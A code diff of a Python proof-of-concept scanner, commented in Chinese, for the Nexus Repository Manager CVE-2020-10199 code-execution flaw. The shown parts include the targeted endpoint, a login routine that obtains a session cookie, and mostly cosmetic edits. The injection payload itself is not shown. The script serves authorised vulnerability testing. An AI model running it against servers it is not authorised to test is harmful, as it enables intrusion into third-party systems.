@@ -1,35 +1,38 @@
 #!/usr/bin/python3
 # -*- coding:utf-8 -*-
+
 """
 Nexus Repository Manager CVE-2020-10199 POC 检测脚本
 
-漏洞描述：
+漏洞描述:
 Nexus Repository Manager 3.x 存在 OGNL 表达式注入漏洞。
 攻击者可以通过构造恶意的请求来执行任意代码。
 
-影响版本：
+影响版本:
 - Nexus Repository Manager 3.21.1 及以下版本
 
-检测原理：
+检测原理:
 通过向 /service/rest/beta/repositories/go/group 端点发送包含
-OGNL 表达式的恶意请求。如果服务器返回计算结果，则说明存在漏洞。
+OGNL 表达式的恶意请求。如果服务器返回计算结果,则说明存在漏洞。
 
-使用方法：
+使用方法:
     python cve_2020_10199_poc.py
     或在代码中调用 poc(url) 函数
 
-参数说明：
-    url: 目标URL，如 http://127.0.0.1:8081
-    timeout: 请求超时时间（秒），默认10秒
+参数说明:
+    url: 目标URL,如 http://127.0.0.1:8081
+    timeout: 请求超时时间(秒),默认10秒
 
-返回值：
+返回值:
     (True, '存在漏洞') - 检测到漏洞
     (False, '安全') - 未检测到漏洞
     (False, '扫描失败 - 错误信息') - 扫描过程中出现错误
 
-注意：
-    此POC仅用于安全测试和授权的渗透测试，请勿用于非法用途。
+注意:
+    此POC仅用于安全测试和授权的渗透测试,请勿用于非法用途。
 """
+
+
 
 import base64
 import requests
@@ -38,17 +41,8 @@ import json
 csrf = "0.15080630880112578"
 
 def get_sessionid(ip, port, password):
-    """
-    获取 Nexus 会话 ID
-    
-    Args:
-        ip: 目标IP地址
-        port: 目标端口号
-        password: 登录密码
-    
-    Returns:
-        str: 会话 ID
-    """
+
+
     url = "http://" + ip + ":" + port
     login_url = url + "/service/rapture/session" # 登录url
     head = {"Content-Type": "application/x-www-form-urlencoded"}
@@ -58,16 +52,19 @@ def get_sessionid(ip, port, password):
     return resp['Set-Cookie'].split(";")[0].split('=')[1]
 
 def poc(url, timeout=10):
+
     """
     检测目标是否存在 Nexus CVE-2020-10199 漏洞
     
     Args:
-        url: 目标URL，如 http://127.0.0.1:8081
-        timeout: 请求超时时间（秒），默认10秒
+        url: 目标URL,如 http://127.0.0.1:8081
+        timeout: 请求超时时间(秒),默认10秒
     
     Returns:
         tuple: (是否存在漏洞, 结果消息)
     """
+
+
     from urllib.parse import urlparse
     parsed = urlparse(url)
     ip = parsed.hostname or parsed.netloc.split(':')[0]
@@ -105,8 +102,3 @@ def poc(url, timeout=10):
     except Exception as e:
         return False, f'Nexus CVE-2020-10199: 扫描失败 - {str(e)}'
 
-if __name__ == "__main__":
-    ip = "127.0.0.1"
-    port="8081"
-    password="admin"
-    poc(ip, port, password)
